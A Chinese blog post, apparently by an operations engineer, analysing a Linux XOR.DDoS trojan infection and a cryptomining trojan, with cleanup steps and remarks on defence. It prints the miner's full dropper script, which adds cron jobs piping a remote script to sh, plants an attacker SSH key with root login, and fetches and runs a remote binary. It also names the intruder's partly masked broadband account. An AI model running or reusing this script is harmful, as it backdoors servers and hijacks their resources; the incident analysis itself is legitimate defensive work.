# Cyber-Security:Linux/XOR.DDoS 样本分析

>在与特洛伊的战争中，我们从未取得优势。— 弗拉基米.耶维奇.严

## Linux/XOR.DDoS 木马入侵分析

![样本](http://o8m8ngokc.bkt.clouddn.com/trojan-demo-1.png)

第一节：编号101

第二节：今天你被挖矿了吗？

##### 工程师的三大法宝

一个有江湖经验的工程师，通常随身携带三件法宝，就像这样：

>用户：这个采集点为什么没数据？
>客服：我们看看
> 工程师各种排查，重启进程
> 客服：现在有了，你再看看？
> 用户：......
> 三天后
> 用户：这个采集点为什么又没数据？
> 工程师各种排查，发现A机房的某台服务器登陆缓慢
> 客服：一台服务器坏了，需要重装系统
> 用户：......
> 系统重装几周后，问题再次来袭
> 工程师：服务器太老了，硬件有问题，建议换新的
> 用户：......

**“没有什么问题是重启解决不了的，如果一次不行，那就两次。”**

在很多情况下，三板斧确实可以解决不少问题。

重启：
包括进程重启和系统重启，鉴于很多程序自身的隐藏性能问题，重启可以释放资源、重新加载配置，或者可能输出异常信息，为解决问题提供思路。
重装：修复被破坏的文件，格式化磁盘，修复配置等。有一定效果。
换机器：对于有年头的机器有效，磁盘、CPU、主板、乃至于不起眼的一颗电池，都有可能是引发性能问题的瓶颈。

如果排除上述因素，就要警惕自己的机器是不是被植入木马了。我们首先来看一个样本。

#### 特征分析
一般特征：功能异常数上升、登陆缓慢、网卡流量异常波动
如果木马程序还没有进程隐藏功能的话，还可以在top看到如下信息
(img)
```
PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
3494 root      19   0  378m  25m  212 R **1595.6**  0.7   5798:34 eyshcjdmzg
```

这是我抓到的第一个木马样本，所以给它取了个代号：101。

### 基础分析
1. 篡改crontab
**-bash-4.3# cat /etc/crontab**
```
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

\# run-parts
01 * * * * root run-parts /etc/cron.hourly
02 4 * * * root run-parts /etc/cron.daily
22 4 * * 0 root run-parts /etc/cron.weekly
42 4 1 * * root run-parts /etc/cron.monthly
\*/3 * * * * root /etc/cron.hourly/gcc.sh
```

2. 程序入口
**-bash-4.3# vi /etc/cron.hourly/gcc.sh**
```
\#!/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/X11R6/bin
for i in `cat /proc/net/dev|grep :|awk -F: {'print $1'}`; do ifconfig $i up& done   
cp /lib/libudev.so /lib/libudev.so.6
/lib/libudev.so.6
```
木马通过crontab创建时间计划任务来实现启动,运行该gcc.sh，该命令启动所有网卡，并拷贝/lib/libudev.so文件到/lib/libudev.so.6并执行该文件。

3. 攻击路径
如果部署了登陆审计平台，或者对方还没来得及清扫犯罪现场，可以看到他的来路：
```
-bash-4.3# last -10
user   pts/3        11X.25.49.200    Mon Jun  6 23:46 - 01:47  (02:01)
```
再根据以上公网IP和时间，可以定位到它的来源是某普通宽带用户。
宽带账号：05919399XXXX@fj
客户名称：危XX

4. 应急清除策略
恢复crontab－>清除gcc.sh －>清除/lib/libudev.so.6 －>查杀进程
一定要注意操作顺序，如果只kill掉进程是没有用的，它已经做到自己复制、重启。


#### XOR.DDoS木马原理
编号101是一款国产的Linux系统的远程控制软件（Linux/XOR.DDoS）。

MalwareMustDie首先在2014年10月曝光了该木马。32位和64位的Linux Web服务器、台式机、ARM架构系统等也容易遭受该木马攻击。

杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。

此外，它主要针对游戏和教育网站，能够对其发起强有力的DDoS攻击，可以达到每秒1500亿字节的恶意流量。根据内容分发网络Akamai科技发布的一份报告，XOR DDoS僵尸网络每天至少瞄准20个网站，将近90%的目标站点位于亚洲。报告中声称：
“Akamai的安全情报反应小组（SIRT）正在追踪XOR DDoS，这是一个木马恶意软件，攻击者使用它劫持Linux机器并将其加入到僵尸网络，以发起分布式拒绝服务攻击（DDoS）活动。迄今为止，XOR DDoS僵尸网络的DDoS攻击带宽从数十亿字节每秒（Gbps）到150+Gbps。游戏行业是其主要的攻击目标，然后是教育机构。今天早上Akamai SIRT发布了一份安全威胁报告，该报告由安全响应工程师Tsvetelin ‘Vincent’ Choranov所作。”

#### 源码分析

**多态（Polymorphic）** 是指恶意软件在自我繁殖期间不断改变（“morphs”）其自身文件特征码（大小、hash等等）的特点，衍生后的恶意软件可能跟以前副本不一致。因此，这种能够自我变种的恶意软件很难使用基于签名扫描的安全软件进行识别和检测。

![样本](http://o8m8ngokc.bkt.clouddn.com/trojan-demo-1.png)

![样本](http://o8m8ngokc.bkt.clouddn.com/trojan-demo-1-2.png)

木马具有非常多功能：增加服务、删除服务、执行程序、隐藏进程、隐藏文件、下载文件、获取系统信息、发起DDOS攻击等行为。
主程序的作用是根据感染目标机器的系统开发版本传输并且选择C&C服务器。
C2服务器归属地为美国,加利福尼亚州,洛杉矶。

其实就算是拿到了样本，逆向难度也很大。何况木马关键数据全部加密，传输过程也加密，哪哪都是加密。笔者曾经试图自行破解，找来了《IDA Pro指南》之类的秘籍，无奈功力不够，只能草草收场。

#### 防御之难

首先，防御一方是守城战。资源有限，防线漫长，安全投入大见效慢。做与不做效果无法评估，做了不代表没有漏洞，不做也不见得出什么大事。

其次，消极安全观主导制度体系建设。每个大单位都有安全责任制，甚至很多地方都上升到安全KPI一票否决的高度。实际情况呢？ 管理上的松散、各自为战，为了安全KPI，消极看待业务需求，逼得业务方剑走偏锋，反而增加了漏洞风险。

最后，攻防双方技术上完全不对等。
攻击者已经进化到大兵团作战模式，兵强马壮，甚至还发展出CaaS（Crime as a Service）这类梦幻般的服务理念。例如僵尸网络不仅可以调度全部资源，提供大规模攻击服务，还能提供间歇性的慢速攻击服务。按需收费，童叟无欺。
防御者基本上还是的大刀长矛。这战没发打。

#### 合作
如果凭借笔者个人的天资和努力，甚至凭借本公司的力量，几乎可以肯定，我们到现在还不一定能知道这款的木马的名字，更不用说管窥它的细节。因为我们根本就不是安全公司，几百号人里面连一个安全专家都没有。这种情况在其它企业应该也具有普遍性。

在这次的案例中，很快就完成了从样本捕获、攻击分析到安全加固的一系列动作，全程业务不受太大影响，甲方用户基本无感知。关键得益于和第三方的充分合作。

微步在线（ThreatBook）——国内首家威胁情报公司。它们的思路很特别，没有去走传统安全公司的老路，而是专注于威胁情报的样本分析、收集和处理，实现大范围长跨度的数据积累，促进情报交流和信息共享，通过合作创造价值。这个思路对于打破行业、竞争企业的壁垒，意义非凡。

最近，它们刚刚拿到A轮投资，资本市场就是敏锐。


##（2）今天你被挖矿了吗？
字数835 阅读115 评论2 喜欢1
书接上文，针对编号101样本的分析，我们已经知道，黑色产业界通过植入木马，控制了大量主机资源，只要有人花钱，就可以按需要调度足够的资源发动DDos攻击，据说还可以按效果付费。

此外，还有一种常见模式则是“挖矿木马”，首先还是来看样本：
~~~
root      3744 29921  0 19:53 pts/0    00:00:00 grep min
root     31333     1 99 19:48 ?        02:46:38
/opt/minerd -B -a cryptonight
-o stratum+tcp://xmr.crypto-pool.fr:8080 -u
48vKMSzWMF8TCVvMJ6jV1BfKZJFwNXRntazXquc7fvq9DW23GKk
cvQMinrKeQ1vuxD4RTmiYmCwY4inWmvCXWbcJHL3JDwp -p x
~~~

uptime看到的负载值非常高。

启动脚本
```bash
echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/crontabs/root

if [ ! -f "/root/.ssh/KHK75NEOiq" ]; then
    mkdir -p ~/.ssh
    rm -f ~/.ssh/authorized_keys*
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" > ~/.ssh/KHK75NEOiq
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
    echo "RSAAuthentication yes" >> /etc/ssh/sshd_config
    echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
    echo "AuthorizedKeysFile .ssh/KHK75NEOiq" >> /etc/ssh/sshd_config
    /etc/init.d/sshd restart
fi

if [ ! -f "/etc/init.d/lady" ]; then
    if [ ! -f "/etc/systemd/system/lady.service" ]; then
        mkdir -p /opt
        curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 && chmod +x /opt/KHK75NEOiq33 && /opt/KHK75NEOiq33
    fi
fi

service lady start
systemctl start lady.service
/etc/init.d/lady start

echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/root
mkdir -p /var/spool/cron/crontabs
echo "*/15 * * * * curl -fsSL https://r.chanstring.com/pm.sh?0706 | sh" > /var/spool/cron/crontabs/root

if [ ! -f "/root/.ssh/KHK75NEOiq" ]; then
    mkdir -p ~/.ssh
    rm -f ~/.ssh/authorized_keys*
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzwg/9uDOWKwwr1zHxb3mtN++94RNITshREwOc9hZfS/F/yW8KgHYTKvIAk/Ag1xBkBCbdHXWb/TdRzmzf6P+d+OhV4u9nyOYpLJ53mzb1JpQVj+wZ7yEOWW/QPJEoXLKn40y5hflu/XRe4dybhQV8q/z/sDCVHT5FIFN+tKez3txL6NQHTz405PD3GLWFsJ1A/Kv9RojF6wL4l3WCRDXu+dm8gSpjTuuXXU74iSeYjc4b0H1BWdQbBXmVqZlXzzr6K9AZpOM+ULHzdzqrA3SX1y993qHNytbEgN+9IZCWlHOnlEPxBro4mXQkTVdQkWo0L4aR7xBlAdY7vRnrvFav root" > ~/.ssh/KHK75NEOiq
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
    echo "RSAAuthentication yes" >> /etc/ssh/sshd_config
    echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
    echo "AuthorizedKeysFile .ssh/KHK75NEOiq" >> /etc/ssh/sshd_config
    /etc/init.d/sshd restart
fi

if [ ! -f "/etc/init.d/lady" ]; then
    if [ ! -f "/etc/systemd/system/lady.service" ]; then
        mkdir -p /opt
        curl -fsSL https://r.chanstring.com/v12/lady_`uname -i` -o /opt/KHK75NEOiq33 && chmod +x /opt/KHK75NEOiq33 && /opt/KHK75NEOiq33
    fi
fi

service lady start
systemctl start lady.service
/etc/init.d/lady start

mkdir -p /opt

# /etc/init.d/lady stop
# systemctl stop lady.service
# pkill /opt/cron
# pkill /usr/bin/cron
# rm -rf /etc/init.d/lady
# rm -rf /etc/systemd/system/lady.service
# rm -rf /opt/KHK75NEOiq33
# rm -rf /usr/bin/cron
# rm -rf /usr/bin/.cron.old
# rm -rf /usr/bin/.cron.new
```

**商业模式**
被植入比特币“挖矿木马”的电脑，系统性能会受到较大影响，电脑操作会明显卡慢、散热风扇狂转；另一个危害在于，“挖矿木马”会大量耗电，并造成显卡、ＣＰＵ等硬件急剧损耗。比特币具有匿名属性，其交易过程是不可逆的，被盗后根本无法查询是被谁盗取，流向哪里，因此也成为黑客的重点窃取对象。

**攻击&防御**
植入方式：安全防护策略薄弱，利用Jenkins、Redis等中间件的漏洞发起攻击，获得root权限。

最好的防御可能还是做好防护策略、严密监控服务器资源消耗（CPU／load）。

这种木马很容易变种，很多情况杀毒软件未必能够识别：
63210b24f42c05b2c5f8fd62e98dba6de45c7d751a2e55700d22983772886017

![](http://upload-images.jianshu.io/upload_images/1037849-a1acdb7f1a4b062c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![](http://upload-images.jianshu.io/upload_images/1037849-6b11b0ad9034756f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 扩展阅读: 网络安全专题合辑《Cyber-Security Manual》
- [Cyber-Security: 警惕 Wi-Fi 漏洞，争取安全上网](https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/)
- [Cyber-Security: Web应用安全：攻击、防护和检测](https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/)
- [Cyber-Security: IPv6 & Security](http://riboseyim.github.io/2017/08/09/Protocol-IPv6/)
- [Cyber-Security: OpenSSH 并不安全](http://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/)
- [Cyber-Security: Linux/XOR.DDoS 木马样本分析](http://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/)
- [浅谈基于数据分析的网络态势感知](http://riboseyim.github.io/2017/07/14/Network-sFlow/)
- [Packet Capturing:关于网络数据包的捕获、过滤和分析](http://riboseyim.github.io/2017/06/16/Network-Pcap/)
- [新一代Ntopng网络流量监控—可视化和架构分析](http://riboseyim.github.io/2016/04/26/Network-Ntopng/)
- [Cyber-Security: 事与愿违的后门程序 | Economist](http://www.jianshu.com/p/670c4d2bb419)
- [Cyber-Security: 美国网络安全立法策略](https://riboseyim.github.io/2016/10/07/CyberSecurity/)
- [Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司](http://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/)

## 参考文献
